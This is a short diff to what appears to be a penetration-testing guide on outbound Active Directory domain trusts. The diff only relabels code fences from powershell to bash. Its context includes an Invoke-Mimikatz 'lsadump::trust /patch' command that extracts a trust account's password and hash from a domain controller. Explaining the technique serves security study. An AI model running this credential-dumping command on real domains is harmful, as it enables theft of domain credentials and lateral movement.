@@ -8,7 +8,7 @@ In this scenario **your domain** is **trusting** some **privileges** to principa
 
 ### Outbound Trust
 
-```powershell
+```bash
 # Notice Outbound trust
 Get-DomainTrust
 SourceName      : root.local
@@ -36,7 +36,7 @@ A security vulnerability exists when a trust relationship is established between
 
 The critical aspect to understand here is that the password and hash of this special account can be extracted from a Domain Controller in domain **A** using a command line tool. The command to perform this action is:
 
-```powershell
+```bash
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
 
